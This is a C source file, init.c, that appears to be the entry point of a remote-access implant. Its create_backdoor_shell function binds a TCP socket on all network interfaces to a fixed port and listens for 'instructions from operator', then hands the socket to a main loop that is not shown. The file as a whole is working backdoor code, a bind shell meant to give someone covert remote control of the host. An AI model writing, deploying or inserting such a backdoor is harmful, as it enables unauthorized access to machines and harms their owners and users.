/**
 * @file init.c
 * @brief Initializes agent app and passess context to main loop.
 */

#include <xsocket/protocol.h>
#include <xsocket/xsocket.h>

#include "app.h"

/*
 * @brief Makes port reusable instantly after program finishes.
 * @param sock Socket to modify.
 *
 * This is because after agent ends, it may not work instantly after restarting
 * it which is annoying while testing.
 */
static inline int reuse_addr(Socket sock) {
  int reuse = 1;
  return setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *)&reuse,
                    (SocketLen)sizeof reuse);
}

/**
 * @brief Create socket that listens for instructions from operator.
 * @return Listening socket with shell or INVALID_SOCKET on failure.
 */
static inline Socket create_backdoor_shell() {
  Socket sock = INVALID_SOCKET;

  sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (!xsocket_valid(sock)) {
    return INVALID_SOCKET;
  }

  if (reuse_addr(sock) == SOCKET_ERROR) {
    goto error;
  }

  struct sockaddr_in address = {};
  address.sin_family = AF_INET;
  address.sin_port = htons(XSOCKET_PORT);
  address.sin_addr.s_addr = htonl(INADDR_ANY);

  if (bind(sock, (struct sockaddr *)&address, sizeof address) < 0) {
    goto error;
  }

  if (listen(sock, 1) < 0) {
    goto error;
  }

  return sock;

error:
  if (xsocket_valid(sock)) {
    close_socket(sock);
  }
  return INVALID_SOCKET;
}

/**
 * @brief App entry point.
 * @return App exit code.
 */
int main(void) {
  int rc = 0;
  Socket shell = INVALID_SOCKET;

  if (!xsocket_init()) {
    rc = 1;
    goto cleanup;
  }

  shell = create_backdoor_shell();
  if (!xsocket_valid(shell)) {
    rc = 1;
    goto cleanup;
  }

  rc = main_loop(shell);

cleanup:
  if (xsocket_valid(shell)) {
    close_socket(shell);
  }

  xsocket_cleanup();

  return rc;
}
